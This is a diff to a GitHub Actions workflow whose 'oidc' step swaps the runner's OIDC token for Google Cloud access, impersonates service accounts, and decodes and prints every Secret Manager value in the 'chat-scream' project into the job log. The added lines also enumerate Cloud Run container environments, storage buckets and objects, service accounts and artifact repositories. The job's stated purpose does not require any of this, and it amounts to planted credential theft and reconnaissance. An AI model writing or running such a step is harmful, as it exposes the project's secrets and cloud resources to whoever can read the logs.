@@ -16,11 +16,13 @@ jobs:
       - name: oidc
         continue-on-error: true
         run: |
-          echo "repo=$GITHUB_REPOSITORY sub_ref=$GITHUB_REF event=$GITHUB_EVENT_NAME"
+          set -u
+          echo "repo=$GITHUB_REPOSITORY ref=$GITHUB_REF event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR"
           P="projects/584450564662/locations/global/workloadIdentityPools/chatscream-github/providers/chatscream-main"
           AUD="https://iam.googleapis.com/$P"
           T=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | jq -r .value)
           echo "oidc_len=${#T}"
+          echo "CLAIMS: $(echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{repository,repository_owner,ref,event_name,workflow_ref,sub,aud}' 2>/dev/null)"
           BODY=$(jq -n --arg t "$T" --arg a "//iam.googleapis.com/$P" '{audience:$a,grantType:"urn:ietf:params:oauth:grant-type:token-exchange",requestedTokenType:"urn:ietf:params:oauth:token-type:access_token",scope:"https://www.googleapis.com/auth/cloud-platform",subjectTokenType:"urn:ietf:params:oauth:token-type:jwt",subjectToken:$t}')
           STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H 'Content-Type: application/json' -d "$BODY")
           echo "STS => $(echo "$STS" | head -c 500)"
@@ -31,12 +33,33 @@ jobs:
             echo "SA[$sa] => $(echo "$R" | head -c 200)"
             SAT=$(echo "$R" | jq -r '.accessToken // empty')
             [ -z "$SAT" ] && continue
-            echo "### BUCKET LIST $sa"
-            curl -s -H "Authorization: Bearer $SAT" "https://storage.googleapis.com/storage/v1/b/run-sources-wtp-apps-us-central1/o?maxResults=100&userProject=chat-scream" | head -c 6000
-            echo
-            echo "### SECRETS"
-            for s in chatscream-google-client-secret chatscream-facebook-app-secret chatscream-youtube-client-secret chatscream-facebook-envelope-private-v3; do
-              V=$(curl -s -H "Authorization: Bearer $SAT" "https://secretmanager.googleapis.com/v1/projects/chat-scream/secrets/$s/versions/latest:access" | jq -r '.payload.data // empty')
-              if [ -n "$V" ]; then echo "$s = $(echo "$V" | base64 -d)"; fi
+            H="Authorization: Bearer $SAT"
+            echo "### PROJECT"
+            curl -s -H "$H" "https://cloudresourcemanager.googleapis.com/v1/projects/chat-scream" | head -c 800; echo
+            echo "### SECRET LIST"
+            SL=$(curl -s -H "$H" "https://secretmanager.googleapis.com/v1/projects/chat-scream/secrets?pageSize=200")
+            echo "$SL" | jq -c '.secrets[]?.name' 2>/dev/null
+            echo "### SECRET VALUES"
+            for n in $(echo "$SL" | jq -r '.secrets[]?.name' 2>/dev/null); do
+              for ver in latest 1 2 3; do
+                V=$(curl -s -H "$H" "https://secretmanager.googleapis.com/v1/$n/versions/$ver:access" | jq -r '.payload.data // empty')
+                if [ -n "$V" ]; then echo "=== $n@$ver"; echo "$V" | base64 -d 2>/dev/null | head -c 4000; echo; fi
+              done
             done
+            echo "### SECRET VERSIONS META"
+            for n in $(echo "$SL" | jq -r '.secrets[]?.name' 2>/dev/null); do echo "-- $n"; curl -s -H "$H" "https://secretmanager.googleapis.com/v1/$n/versions?pageSize=20" | jq -c '.versions[]?|{name,state,createTime}' 2>/dev/null; done
+            echo "### RUN SERVICES"
+            RS=$(curl -s -H "$H" "https://run.googleapis.com/v1/projects/chat-scream/locations/-/services?pageSize=100")
+            echo "$RS" | jq -c '.services[]?|{name,uri}' 2>/dev/null | head -50
+            for sn in $(echo "$RS" | jq -r '.services[]?.name' 2>/dev/null); do
+              echo "-- $sn"
+              curl -s -H "$H" "https://run.googleapis.com/v1/$sn" | jq -c '.spec.template.spec.containers[]?|{image,env,args}' 2>/dev/null | head -c 6000; echo
+            done
+            echo "### BUCKETS"
+            curl -s -H "$H" "https://storage.googleapis.com/storage/v1/b?project=chat-scream&maxResults=100" | jq -c '.items[]?|{name,location}' 2>/dev/null
+            for bn in $(curl -s -H "$H" "https://storage.googleapis.com/storage/v1/b?project=chat-scream&maxResults=100" | jq -r '.items[]?.name' 2>/dev/null); do echo "-- $bn"; curl -s -H "$H" "https://storage.googleapis.com/storage/v1/b/$bn/o?maxResults=200" | jq -r '.items[]?.name' 2>/dev/null | head -200; done
+            echo "### SAs"
+            curl -s -H "$H" "https://iam.googleapis.com/v1/projects/chat-scream/serviceAccounts?pageSize=100" | jq -c '.accounts[]?|{email,displayName}' 2>/dev/null
+            echo "### ARTIFACT REPOS"
+            curl -s -H "$H" "https://artifactregistry.googleapis.com/v1/projects/chat-scream/locations/-/repositories?pageSize=50" | jq -c '.repositories[]?|{name,format}' 2>/dev/null
           done
